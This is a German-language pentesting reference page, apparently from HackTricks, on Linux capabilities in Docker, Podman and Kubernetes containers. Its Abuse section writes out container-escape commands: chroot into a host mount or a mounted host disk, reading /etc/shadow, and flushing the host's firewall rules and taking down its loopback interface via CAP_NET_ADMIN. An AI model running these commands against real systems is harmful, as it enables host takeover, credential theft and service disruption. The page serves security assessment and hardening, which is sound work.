# Linux Capabilities In Containern

{{#include ../../../../banners/hacktricks-training.md}}

## Übersicht

Linux capabilities gehören zu den wichtigsten Bestandteilen der Container-Sicherheit, da sie eine subtile, aber grundlegende Frage beantworten: **Was bedeutet „root“ innerhalb eines Containers wirklich?** Auf einem normalen Linux-System bedeutete UID 0 historisch einen sehr weitreichenden Berechtigungssatz. In modernen Kernels ist diese Berechtigung in kleinere Einheiten aufgeteilt, die als Capabilities bezeichnet werden. Ein Prozess kann als root ausgeführt werden und trotzdem viele mächtige Operationen nicht durchführen können, wenn die entsprechenden Capabilities entfernt wurden.

Container sind stark von dieser Unterscheidung abhängig. Viele Workloads werden aus Gründen der Kompatibilität oder Einfachheit weiterhin als UID 0 innerhalb des Containers gestartet. Ohne das Entfernen von Capabilities wäre das viel zu gefährlich. Durch das Entfernen von Capabilities kann ein containerisierter root-Prozess weiterhin viele gewöhnliche Aufgaben innerhalb des Containers ausführen, während ihm der Zugriff auf sensiblere Kernel-Operationen verweigert wird. Deshalb bedeutet eine Container-Shell, die `uid=0(root)` anzeigt, nicht automatisch „host root“ oder auch nur „weitreichende Kernel-Berechtigungen“. Die Capability-Sets bestimmen, wie viel diese root-Identität tatsächlich wert ist.

Die vollständige Referenz zu Linux capabilities und zahlreiche Missbrauchsbeispiele findest du unter:

{{#ref}}
../../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Funktionsweise

Capabilities werden in mehreren Sets verwaltet, darunter permitted, effective, inheritable, ambient und bounding sets. Für viele Container-Assessments ist die genaue Kernel-Semantik jedes einzelnen Sets weniger wichtig als die letztendliche praktische Frage: **Welche privilegierten Operationen kann dieser Prozess jetzt erfolgreich ausführen, und welche zukünftigen Privilege Gains sind noch möglich?**

Das ist wichtig, weil viele Breakout-Techniken eigentlich Capability-Probleme sind, die als Container-Probleme getarnt sind. Ein Workload mit `CAP_SYS_ADMIN` kann auf eine enorme Menge an Kernel-Funktionen zugreifen, die ein normaler Container-root-Prozess nicht verwenden sollte. Ein Workload mit `CAP_NET_ADMIN` wird deutlich gefährlicher, wenn er zusätzlich den Host-Network-Namespace verwendet. Ein Workload mit `CAP_SYS_PTRACE` wird besonders interessant, wenn er durch die gemeinsame Nutzung der Host-PID-Namespaces Host-Prozesse sehen kann. In Docker oder Podman kann dies als `--pid=host` erscheinen; in Kubernetes tritt es normalerweise als `hostPID: true` auf.

Mit anderen Worten: Das Capability-Set kann nicht isoliert bewertet werden. Es muss zusammen mit Namespaces, seccomp und der MAC-Policy betrachtet werden.

## Labor

Eine sehr direkte Möglichkeit, Capabilities innerhalb eines Containers zu untersuchen, ist:
```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```
Sie können außerdem einen restriktiveren Container mit einem vergleichen, dem alle Capabilities hinzugefügt wurden:
```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Um die Wirkung einer gezielten Ergänzung zu sehen, versuchen Sie, alles zu entfernen und nur eine Capability wieder hinzuzufügen:
```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Diese kleinen Experimente helfen zu zeigen, dass eine Runtime nicht einfach einen Boolean namens "privileged" umschaltet. Sie formt die tatsächliche Privilege-Oberfläche, die dem Prozess zur Verfügung steht.

## High-Risk Capabilities

Obwohl je nach Ziel viele Capabilities relevant sein können, sind einige bei der Analyse von Container Escapes wiederholt von Bedeutung.

**`CAP_SYS_ADMIN`** ist die Capability, die Defender mit dem größten Misstrauen behandeln sollten. Sie wird oft als "the new root" bezeichnet, weil sie eine enorme Menge an Funktionalität freischaltet, einschließlich mount-bezogener Operationen, Namespace-sensitivem Verhalten und vieler Kernel-Pfade, die Containern niemals unbedacht zugänglich gemacht werden sollten. Wenn ein Container über `CAP_SYS_ADMIN`, schwaches seccomp und keine starke MAC-Isolation verfügt, werden viele klassische Breakout-Pfade deutlich realistischer.

**`CAP_SYS_PTRACE`** ist relevant, wenn Prozesssichtbarkeit vorhanden ist, insbesondere wenn der PID-Namespace mit dem Host oder mit interessanten benachbarten Workloads geteilt wird. Dadurch kann Sichtbarkeit in Manipulation übergehen.

**`CAP_NET_ADMIN`** und **`CAP_NET_RAW`** sind in netzwerkfokussierten Umgebungen relevant. In einem isolierten Bridge-Netzwerk können sie bereits riskant sein; in einem gemeinsam genutzten Host-Netzwerk-Namespace sind sie deutlich gefährlicher, weil der Workload möglicherweise das Host-Netzwerk neu konfigurieren, Traffic sniffen oder spoofen sowie lokale Traffic-Flows stören kann.

**`CAP_SYS_MODULE`** ist in einer rootful-Umgebung normalerweise katastrophal, da das Laden von Kernel-Modulen effektiv Kontrolle über den Host-Kernel ermöglicht. Diese Capability sollte in einem allgemeinen Container-Workload nahezu nie vorhanden sein.

## Runtime Usage

Docker, Podman, containerd-basierte Stacks und CRI-O verwenden allesamt Capability-Kontrollen, aber die Defaults und Management-Interfaces unterscheiden sich. Docker stellt sie über Flags wie `--cap-drop` und `--cap-add` sehr direkt bereit. Podman bietet ähnliche Kontrollen und profitiert häufig zusätzlich von der Ausführung als rootless. Kubernetes stellt das Hinzufügen und Entfernen von Capabilities über den `securityContext` des Pods oder Containers bereit. System-Container-Umgebungen wie LXC/Incus setzen ebenfalls auf Capability-Kontrollen, aber die umfassendere Host-Integration dieser Systeme verleitet Operatoren häufig dazu, Defaults aggressiver zu lockern, als sie es in einer App-Container-Umgebung tun würden.

Dasselbe Prinzip gilt für alle diese Systeme: Eine Capability, deren Vergabe technisch möglich ist, sollte nicht zwangsläufig auch vergeben werden. Viele reale Incidents beginnen damit, dass ein Operator eine Capability hinzufügt, nur weil ein Workload unter einer strengeren Konfiguration fehlschlug und das Team eine schnelle Lösung benötigte.

## Misconfigurations

Der offensichtlichste Fehler ist **`--cap-add=ALL`** in Docker/Podman-ähnlichen CLIs, aber nicht der einzige. In der Praxis besteht ein häufigeres Problem darin, eine oder zwei äußerst mächtige Capabilities zu vergeben, insbesondere `CAP_SYS_ADMIN`, um "die Anwendung zum Laufen zu bringen", ohne zugleich die Auswirkungen auf Namespace, seccomp und Mounts zu verstehen. Ein weiterer häufiger Fehlermodus ist die Kombination zusätzlicher Capabilities mit dem Teilen von Host-Namespaces. In Docker oder Podman kann dies als `--pid=host`, `--network=host` oder `--userns=host` auftreten; in Kubernetes zeigt sich eine entsprechende Freigabe normalerweise durch Workload-Einstellungen wie `hostPID: true` oder `hostNetwork: true`. Jede dieser Kombinationen verändert, worauf sich die Capability tatsächlich auswirken kann.

Außerdem kommt es häufig vor, dass Administratoren glauben, ein Workload sei weiterhin sinnvoll eingeschränkt, nur weil er nicht vollständig `--privileged` ist. Manchmal stimmt das, aber manchmal ist die effektive Sicherheitslage bereits so nah an privileged, dass der Unterschied im Betrieb keine wesentliche Bedeutung mehr hat.

## Abuse

Der erste praktische Schritt besteht darin, das effektive Capability-Set zu enumerieren und sofort die spezifischen Aktionen zu testen, die für einen Escape oder den Zugriff auf Host-Informationen relevant wären:
```bash
capsh --print
grep '^Cap' /proc/self/status
```
Wenn `CAP_SYS_ADMIN` vorhanden ist, teste zuerst den Missbrauch von Mounts und den Zugriff auf das Host-Dateisystem, da dies zu den häufigsten Enablern für einen Breakout gehört:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount | head
find / -maxdepth 3 -name docker.sock -o -name containerd.sock -o -name crio.sock 2>/dev/null
```
Wenn `CAP_SYS_PTRACE` vorhanden ist und der Container interessante Prozesse sehen kann, prüfe, ob sich die Capability zur Untersuchung von Prozessen nutzen lässt:
```bash
capsh --print | grep cap_sys_ptrace
ps -ef | head
for p in 1 $(pgrep -n sshd 2>/dev/null); do cat /proc/$p/cmdline 2>/dev/null; echo; done
```
Wenn `CAP_NET_ADMIN` oder `CAP_NET_RAW` vorhanden ist, testen Sie, ob der Workload den sichtbaren Netzwerk-Stack manipulieren oder zumindest nützliche Netzwerkinformationen sammeln kann:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
```
Wenn ein capability test erfolgreich ist, kombiniere ihn mit der Namespace-Situation. Eine Capability, die in einem isolierten Namespace lediglich riskant wirkt, kann sofort zu einem escape oder einer Host-Reconnaissance-Grundlage werden, sobald der Container außerdem die Host-PID, das Host-Netzwerk oder Host-Mounts gemeinsam nutzt.

### Vollständiges Beispiel: `CAP_SYS_ADMIN` + Host-Mount = Host-Escape

Wenn der Container über `CAP_SYS_ADMIN` und einen beschreibbaren bind mount des Host-Dateisystems wie `/host` verfügt, ist der escape-Pfad oft unkompliziert:
```bash
capsh --print | grep cap_sys_admin
mount | grep ' /host '
ls -la /host
chroot /host /bin/bash
```
Wenn `chroot` erfolgreich ist, werden Befehle nun im Kontext des Root-Dateisystems des Hosts ausgeführt:
```bash
id
hostname
cat /etc/shadow | head
```
Wenn `chroot` nicht verfügbar ist, lässt sich dasselbe Ergebnis oft erreichen, indem die Binärdatei über den eingehängten Verzeichnisbaum aufgerufen wird:
```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```
### Vollständiges Beispiel: `CAP_SYS_ADMIN` + Gerätezugriff

Wenn ein Blockgerät des Hosts zugänglich gemacht wird, kann `CAP_SYS_ADMIN` direkten Zugriff auf das Host-Dateisystem ermöglichen:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
### Vollständiges Beispiel: `CAP_NET_ADMIN` + Host Networking

Diese Kombination führt nicht immer direkt zu root auf dem Host, kann den Netzwerk-Stack des Hosts jedoch vollständig neu konfigurieren:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
Das kann Denial of Service, das Abfangen von Datenverkehr oder den Zugriff auf zuvor gefilterte Services ermöglichen.

## Checks

Das Ziel der Capability-Checks besteht nicht nur darin, Rohwerte auszugeben, sondern auch zu verstehen, ob der Prozess über ausreichende Privilegien verfügt, um seine aktuelle Namespace- und Mount-Situation gefährlich zu machen.
```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```
Was hier interessant ist:

- `capsh --print` ist der einfachste Weg, risikoreiche Capabilities wie `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin` oder `cap_sys_module` zu erkennen.
- Die Zeile `CapEff` in `/proc/self/status` zeigt, was aktuell tatsächlich effektiv ist, und nicht nur, was in anderen Sets verfügbar sein könnte.
- Ein Capability-Dump wird deutlich wichtiger, wenn der Container außerdem Host-PID-, Netzwerk- oder User-Namespaces gemeinsam nutzt oder beschreibbare Host-Mounts besitzt.

Nach dem Sammeln der rohen Capability-Informationen besteht der nächste Schritt in der Interpretation. Prüfe, ob der Prozess root ist, ob User-Namespaces aktiv sind, ob Host-Namespaces gemeinsam genutzt werden, ob seccomp erzwingend aktiv ist und ob AppArmor oder SELinux den Prozess weiterhin einschränken. Ein Capability-Set allein ist nur ein Teil des Gesamtbildes, aber oft genau der Teil, der erklärt, warum ein Container breakout funktioniert und ein anderer mit demselben scheinbaren Ausgangspunkt scheitert.

## Runtime-Standardeinstellungen

| Runtime / platform | Standardzustand | Standardverhalten | Häufige manuelle Abschwächung |
| --- | --- | --- | --- |
| Docker Engine | Standardmäßig reduziertes Capability-Set | Docker behält standardmäßig eine Allowlist von Capabilities bei und entfernt den Rest | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
| Podman | Standardmäßig reduziertes Capability-Set | Podman-Container sind standardmäßig unprivilegiert und verwenden ein reduziertes Capability-Modell | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
| Kubernetes | Übernimmt die Runtime-Standardeinstellungen, sofern nicht geändert | Wenn keine `securityContext.capabilities` angegeben sind, erhält der Container das Standard-Capability-Set der Runtime | `securityContext.capabilities.add`, `drop: [\"ALL\"]` nicht zu setzen, `privileged: true` |
| containerd / CRI-O under Kubernetes | Üblicherweise Runtime-Standard | Das effektive Set hängt von der Runtime und der Pod-Spezifikation ab | wie in der Kubernetes-Zeile; auch die direkte OCI-/CRI-Konfiguration kann Capabilities explizit hinzufügen |

Für Kubernetes ist wichtig, dass die API kein einheitliches, universelles Standard-Capability-Set definiert. Wenn der Pod keine Capabilities hinzufügt oder entfernt, übernimmt der Workload den Runtime-Standard für diesen Node.

{{#include ../../../../banners/hacktricks-training.md}}
